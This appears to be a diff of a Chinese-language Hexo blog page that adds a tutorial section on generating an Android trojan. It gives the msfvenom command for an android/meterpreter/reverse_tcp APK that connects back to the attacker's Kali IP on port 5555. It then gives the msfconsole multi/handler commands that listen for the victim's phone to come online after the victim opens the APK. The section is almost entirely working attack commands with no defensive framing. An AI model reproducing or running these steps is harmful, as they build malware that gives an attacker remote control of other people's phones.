@@ -191,7 +191,11 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/Runner691/image/main/imgimage-20231203144346256.png"></p>
-<h3 id="二、手机木马生成"><a href="#二、手机木马生成" class="headerlink" title="二、手机木马生成"></a>二、手机木马生成</h3>
+<h3 id="二、手机木马生成"><a href="#二、手机木马生成" class="headerlink" title="二、手机木马生成"></a>二、手机木马生成</h3><p>1、打开kali虚拟机，在终端中输入下列指令生成木马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=你kali的ip LPORT=5555 R &gt; /home/kali/apk.apk</span><br></pre></td></tr></table></figure>
+
+<p>2、输入下面代码打开msf并监听，同时用手机打开刚刚生成的木马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler   //加载模块</span><br><span class="line">set payload android/meterpreter/reverse_tcp   //选择Payload</span><br><span class="line">show options   //查看参数设置</span><br><span class="line">set LHOST kali IP  //这里的地址设置成我们刚才生成木马的IP地址</span><br><span class="line">set LPORT 5555   //这里的端口设置成刚才我们生成木马所监听的端口</span><br><span class="line">exploit   //开始执行漏洞 开始监听,等待手机上线</span><br></pre></td></tr></table></figure>
       
     </div>
     <footer>
